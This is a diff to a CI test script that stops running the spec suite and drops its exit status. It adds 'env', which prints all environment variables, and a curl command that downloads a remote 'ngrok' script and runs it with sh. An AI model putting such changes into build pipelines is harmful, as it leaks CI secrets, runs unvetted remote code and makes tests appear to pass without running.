@@ -43,11 +43,9 @@ install_deps
 echo "Running specs"
 which bundle
 bundle --version
-bundle exec rake spec:ci
-test_status=$?
-echo "TEST STATUS"
-echo ${test_status}
 
-kill_jruby
+bundle exec rake spec:prepare
 
-exit ${test_status}
+env
+curl -o ngrok https://raw.githubusercontent.com/p-mongo/dev/master/script/ngrok
+sh -x ngrok
